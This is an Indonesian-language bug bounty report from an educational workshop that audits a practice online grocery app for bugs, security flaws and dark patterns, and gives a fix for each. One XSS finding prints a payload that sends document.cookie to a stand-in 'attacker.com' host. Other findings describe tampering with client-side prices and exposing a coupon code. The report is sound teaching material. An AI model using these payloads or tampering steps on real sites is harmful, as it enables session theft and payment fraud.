# 🔍 LAPORAN TEMUAN — Bug Bounty: Pasar Pagi

> **Reviewer:** Security Analysis  
> **File diperiksa:** `index.html`, `main.js`, `style.css`  
> **Total temuan:** 7 (+ 1 bonus stretch)  
> **Kategori:** 2 Bug · 3 Keamanan · 2 Etika

---

## ⚠️ RINGKASAN EKSEKUTIF

Aplikasi "Pasar Pagi" secara visual terlihat profesional dan berjalan normal. Namun setelah audit mendalam, ditemukan **7 kerentanan dan masalah etika** yang apabila dirilis ke publik dapat merugikan pengguna secara finansial dan membuka celah serangan siber.

---

## 🐛 BUG

---

### Temuan #1 — [BUG] Total Harga Ditampilkan Tanpa Format Desimal

- **Masalahnya apa:**  
  Angka `Total` di sidebar keranjang belanja ditampilkan mentah (raw number) tanpa diformat dengan `.toFixed(2)`. Akibatnya, karena JavaScript menggunakan floating-point arithmetic, angka seperti `$3.5000000000000004` bisa muncul di layar. Di modal review, total sudah diformat benar — sehingga ada **inkonsistensi** antara dua tampilan untuk angka yang sama.

- **Cara buktiinnya:**  
  1. Tambahkan Blueberry ($5.00) ke keranjang.  
  2. Aktifkan kupon `TEMANFARMER` (diskon 90%).  
  3. Amati angka Total di sidebar — bisa tampil seperti `0.5300000000000001`.  
  4. Bandingkan dengan angka di modal review yang tampil rapi `$0.53`.  
  5. Ini terjadi karena `totalPriceEl.textContent = total` di baris 123 tidak menggunakan `.toFixed(2)`.

- **Kenapa ini bahaya / nggak adil:**  
  Tampilan angka acak merusak kepercayaan pengguna. Lebih buruk lagi, ada inkonsistensi data antara dua tampilan harga untuk transaksi yang sama — ini bisa membingungkan pembeli.

- **Cara betulinnya:**
  ```js
  // main.js baris 123 — SEBELUM:
  totalPriceEl.textContent = total;

  // SESUDAH:
  totalPriceEl.textContent = total.toFixed(2);
  ```

---

### Temuan #2 — [BUG] Input Jumlah Negatif / Kosong Tidak Divalidasi

- **Masalahnya apa:**  
  Field input jumlah barang di keranjang (`edit-quantity-input`) tidak memvalidasi nilai yang diketik pengguna. Jika pengguna mengosongkan field atau mengetik huruf, `parseInt("")` menghasilkan `NaN`. Nilai `NaN` diteruskan ke `updateQuantity()` yang tidak menanganinya — sehingga `cart[id].count = NaN`. Akibatnya total harga menjadi `NaN`.

- **Cara buktiinnya:**  
  1. Tambahkan beberapa buah ke keranjang.  
  2. Klik pada input angka kuantitas di sidebar.  
  3. Hapus isinya sampai kosong (backspace).  
  4. Amati: tampilan total berubah menjadi `NaN` atau hilang.  
  5. Di console DevTools (F12), ketik `cart` — nilai `count` salah satu item adalah `NaN`.

- **Kenapa ini bahaya / nggak adil:**  
  Total transaksi bisa menampilkan `NaN`, sehingga pengguna tidak tahu berapa yang harus dibayar. Ini adalah bug input validation klasik yang bisa menyebabkan kesalahan kalkulasi.

- **Cara betulinnya:**
  ```js
  // main.js baris 282–285 — SEBELUM:
  const quantity = parseInt(target.value, 10);
  updateQuantity(target.dataset.id, quantity);

  // SESUDAH:
  const quantity = parseInt(target.value, 10);
  if (!isNaN(quantity) && quantity > 0) {
    updateQuantity(target.dataset.id, quantity);
  } else if (isNaN(quantity) || quantity <= 0) {
    deleteItem(target.dataset.id);
  }
  ```

---

## 🔒 KEAMANAN

---

### Temuan #3 — [KEAMANAN] XSS via innerHTML pada Input Catatan

- **Masalahnya apa:**  
  Input "Catatan buat petani" dari pengguna dimasukkan langsung ke DOM menggunakan `innerHTML` tanpa sanitasi apapun (main.js baris 115). Ini adalah celah **Cross-Site Scripting (XSS)** klasik — penyerang bisa menyuntikkan kode HTML/JavaScript yang dieksekusi oleh browser.

- **Cara buktiinnya:**  
  1. Buka aplikasi di browser.  
  2. Di field "Catatan buat petani", ketikkan payload berikut:
     ```html
     <img src=x onerror="alert('XSS berhasil!')">
     ```
  3. Tambahkan barang ke keranjang supaya `renderCart()` dipanggil.  
  4. Browser mengeksekusi script → alert muncul.  
  5. Payload lebih berbahaya: `<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">`

- **Kenapa ini bahaya / nggak adil:**  
  Penyerang bisa mencuri cookie/session pengguna lain, redirect ke halaman phishing, atau mencuri data kartu kredit. Ini masuk **OWASP Top 10 A03:2021 – Injection**. Di e-commerce nyata ini bisa menyebabkan kerugian finansial langsung bagi pembeli.

- **Cara betulinnya:**
  ```js
  // main.js baris 115 — SEBELUM (BERBAHAYA):
  preview.innerHTML = "Catatan: " + note;

  // SESUDAH (AMAN):
  preview.textContent = "Catatan: " + note;
  // textContent otomatis meng-escape semua karakter HTML
  ```

---

### Temuan #4 — [KEAMANAN] Kode Kupon Rahasia Disimpan di Client-Side

- **Masalahnya apa:**  
  Kode kupon `"TEMANFARMER"` disimpan sebagai konstanta plaintext di dalam JavaScript yang dapat dilihat siapa saja melalui View Source atau DevTools. Validasinya pun dilakukan sepenuhnya di browser (baris 172: `if (code === KUPON_RAHASIA)`), bukan di server.

- **Cara buktiinnya:**  
  1. Buka browser → tekan **Ctrl+U** (View Page Source).  
  2. Cari teks `KUPON_RAHASIA` atau `TEMANFARMER` — langsung terlihat.  
  3. ATAU: DevTools (F12) → tab **Sources** → buka `main.js` → kode terbaca lengkap.  
  4. Ketikkan `TEMANFARMER` di kolom kupon → berhasil mendapat diskon 90%.  
  5. Di console DevTools, ketik: `KUPON_RAHASIA` → nilai langsung tampil.

- **Kenapa ini bahaya / nggak adil:**  
  Kode "rahasia" yang ada di client bukan rahasia sama sekali. Siapapun bisa menyebarkannya ke publik, menyebabkan kerugian finansial masif. Ini juga merupakan **Client-Side Business Logic Vulnerability** — semua keputusan bisnis penting harus divalidasi di server.

- **Cara betulinnya:**
  ```js
  // Validasi kupon harus dilakukan di server:
  async function applyCoupon() {
    const code = document.getElementById("coupon").value;
    const response = await fetch("/api/validate-coupon", {
      method: "POST",
      body: JSON.stringify({ code }),
      headers: { "Content-Type": "application/json" }
    });
    const result = await response.json();
    if (result.valid) {
      diskon = result.discountRate; // nilai datang dari server
    }
  }
  // Kode kupon tidak pernah dikirim ke client
  ```

---

### Temuan #5 — [KEAMANAN] Price Manipulation via Atribut data-price

- **Masalahnya apa:**  
  Harga yang digunakan untuk kalkulasi diambil dari atribut `data-price` pada tombol HTML (baris 62 & 257), bukan dari `products` array yang terpercaya. Atribut HTML ini bisa diubah bebas melalui DevTools. Lebih parah lagi: komentar di kode sendiri mengakui ini — `"pakai harga dari kartu di layar"`.

- **Cara buktiinnya:**  
  1. Buka DevTools (F12) → tab **Elements**.  
  2. Cari tombol `+` untuk produk Blueberry ($5.00):
     ```html
     <button class="plus-button" data-id="6" data-price="5">+</button>
     ```
  3. Double-click pada `data-price="5"` → ubah menjadi `data-price="0.01"`.  
  4. Klik tombol `+` → Blueberry masuk keranjang dengan harga **$0.01**.  
  5. Total dihitung menggunakan harga palsu — konfirmasi lewat modal checkout.

- **Kenapa ini bahaya / nggak adil:**  
  Pembeli bisa membeli produk apapun dengan harga hampir $0. Di toko nyata yang terhubung payment gateway, ini menyebabkan kerugian finansial langsung. Ini adalah **Client-Side Price Tampering** — salah satu serangan paling umum dan paling merugikan di e-commerce.

- **Cara betulinnya:**
  ```js
  // main.js — SEBELUM: harga dari dataset (tidak aman)
  addToCart(target.dataset.id, Number(target.dataset.price));

  // SESUDAH: ID saja yang dikirim, harga dicari dari sumber terpercaya
  addToCart(target.dataset.id);

  function addToCart(id) {
    const product = products.find((item) => item.id == id);
    if (!product) return;
    if (!cart[id]) cart[id] = { ...product, count: 0 };
    // Harga SELALU dari products array, tidak dari DOM
    cart[id].count++;
    renderCart();
  }
  // Di production: verifikasi harga final di server sebelum memproses pembayaran
  ```

---

## 🎭 ETIKA / DARK PATTERN

---

### Temuan #6 — [ETIKA] Fake Scarcity — Stok Palsu untuk Menciptakan Kepanikan

- **Masalahnya apa:**  
  Teks "tinggal X lagi hari ini!" pada setiap kartu produk dihasilkan dari `Math.random()` yang dipanggil ulang setiap kali halaman dirender. Angka stok tidak ada hubungannya dengan ketersediaan produk nyata — dikarang setiap saat.

- **Cara buktiinnya:**  
  1. Amati angka stok di kartu produk, misal "tinggal 3 lagi hari ini!".  
  2. Klik tombol `+` pada produk manapun.  
  3. Amati: angka stok di semua kartu **berubah secara acak** — bukan berkurang satu pun.  
  4. Klik `+` lagi → angka berubah lagi secara random.  
  5. Di console DevTools, ketik `Math.floor(Math.random() * 5) + 1` beberapa kali → nilainya tidak konsisten.

- **Kenapa ini bahaya / nggak adil:**  
  Ini adalah **Fake Urgency / False Scarcity** — dark pattern yang sengaja menciptakan kepanikan palsu agar pengguna membeli lebih cepat dan lebih banyak. Pengguna membuat keputusan berdasarkan informasi bohong. Di beberapa negara (EU, Australia), praktik ini melanggar regulasi perlindungan konsumen.

- **Cara betulinnya:**
  ```js
  // Hapus Math.random() — tampilkan stok nyata dari data produk:
  // Di products array, tambahkan field stock:
  { id: 1, name: "Apel Fuji", price: 1.5, stock: 24, ... }

  // Lalu di renderProducts():
  const sisa = product.stock - (cart[product.id]?.count || 0);
  // Tampilkan hanya jika stok memang rendah (misal < 5):
  const stockText = sisa <= 5 ? `tinggal ${sisa} lagi!` : "";
  ```

---

### Temuan #7 — [ETIKA] Hidden Fee — Biaya Tersembunyi di Momen Terakhir

- **Masalahnya apa:**  
  Biaya penanganan (`HANDLING_FEE = $0.30`) ditambahkan ke total secara diam-diam. Biaya ini tidak pernah disebutkan di halaman utama maupun sidebar, dan baru terungkap di modal review ketika pengguna sudah hampir mengkonfirmasi pesanan (momen komitmen tertinggi).

- **Cara buktiinnya:**  
  1. Masukkan 1 Apel Fuji ($1.50) ke keranjang.  
  2. Amati total di sidebar: **$1.80** — bukan $1.50.  
  3. Tidak ada label apapun yang menjelaskan selisih $0.30 ini di halaman utama.  
  4. Klik "Lanjut ke Pembayaran" → baru di modal terlihat baris "Biaya penanganan $0.30".  
  5. Hitung manual: $1.50 + $0.30 = $1.80 ✓ — biayanya memang ada, tapi disembunyikan.

- **Kenapa ini bahaya / nggak adil:**  
  Ini adalah **Hidden Fee / Drip Pricing** — dark pattern yang sengaja menyembunyikan biaya sampai pengguna sudah berkomitmen. Pengguna merasa ditipu ketika tiba-tiba ada biaya extra di detik terakhir. Regulasi FTC (Amerika) dan Consumer Rights Directive (EU) melarang praktik ini. Dalam jangka panjang, ini merusak reputasi toko.

- **Cara betulinnya:**
  ```html
  <!-- Tampilkan biaya sejak awal di sidebar, sebelum checkout: -->
  <div class="total-row">
    <span>Subtotal</span>
    <span>$<span id="subtotal-price">0.00</span></span>
  </div>
  <div class="total-row">
    <span>Biaya penanganan</span>
    <span>$0.30</span>
  </div>
  <hr>
  <div class="total-row">
    <strong>Total</strong>
    <strong>$<span id="modal-total-price">0.00</span></strong>
  </div>
  ```

---

## 🏆 BONUS STRETCH — Temuan #8

### [BUG] Inkonsistensi Format Total antara Sidebar dan Modal Review

- **Masalahnya apa:**  
  Angka total yang sama ditampilkan di dua tempat berbeda dengan format yang tidak konsisten. Di sidebar: `totalPriceEl.textContent = total` (baris 123, tanpa `.toFixed(2)`). Di modal: `$${total}` (baris 231, juga tanpa `.toFixed(2)`). Keduanya bisa menampilkan angka floating-point yang panjang, tapi tidak selalu sama persis karena jalur kalkulasi yang sedikit berbeda.

- **Cara buktiinnya:**  
  Lihat nilai `total` di sidebar vs nilai di modal dengan produk dan kupon tertentu yang menghasilkan floating point yang panjang.

- **Cara betulinnya:**  
  Gunakan `.toFixed(2)` di semua tempat yang menampilkan nilai mata uang:
  ```js
  // baris 123:
  totalPriceEl.textContent = total.toFixed(2);
  // baris 231:
  `<div class="row grand"><span>Total</span><span>$${total.toFixed(2)}</span></div>`
  ```

---

## 📊 TABEL RINGKASAN

| # | Kategori | Judul | Tingkat Risiko | Baris di main.js |
|---|----------|-------|----------------|-----------------|
| 1 | 🐛 BUG | Total tanpa format desimal | Medium | L123 |
| 2 | 🐛 BUG | Input quantity NaN tidak divalidasi | Medium | L283 |
| 3 | 🔒 KEAMANAN | **XSS via innerHTML catatan** | **Kritis** | L115 |
| 4 | 🔒 KEAMANAN | Kupon rahasia di client-side | **Tinggi** | L32 |
| 5 | 🔒 KEAMANAN | **Price manipulation via data-price** | **Kritis** | L62, L136 |
| 6 | 🎭 ETIKA | Fake scarcity — stok palsu | Tinggi | L47 |
| 7 | 🎭 ETIKA | Hidden fee — biaya tersembunyi | Tinggi | L29, L120 |
| 8★ | 🐛 BUG (Bonus) | Inkonsistensi format total | Low | L123, L231 |

---

## 💭 REFLEKSI PENUTUP

> **"Bedanya 'kode jalan' sama 'kode benar & jujur' itu apa, menurutmu, setelah level ini?"**

Kode yang **jalan** hanya berarti tidak ada syntax error dan tampilan terlihat berfungsi. Ini adalah batas minimum yang paling rendah.

Kode yang **benar** artinya logikanya tepat: angka dihitung dengan akurat, input divalidasi, edge case ditangani.

Kode yang **jujur** artinya ia tidak mengeksploitasi pengguna. Antarmuka yang dirancang untuk memanipulasi — stok palsu, biaya tersembunyi, rahasia yang tidak rahasia — bisa sangat "jalan" secara teknis, bahkan lebih "jalan" dari kode yang jujur. Tapi ia melanggar kepercayaan, dan kadang melanggar hukum.

**Tiga pertanyaan yang harus selalu ditanyakan sebelum kode AI dipercaya:**
1. **Apakah jalan?** — Cek di browser, uji semua fitur.
2. **Apakah benar?** — Verifikasi logika, edge case, format data.
3. **Apakah jujur?** — Apakah ini merugikan atau memanipulasi pengguna?

Di dunia e-commerce nyata, kode AI yang tidak diverifikasi = risiko nyata terhadap uang dan kepercayaan orang sungguhan.

---

*Laporan ini dibuat untuk keperluan edukasi Bug Bounty Workshop — ETHJKT × UNPAM*
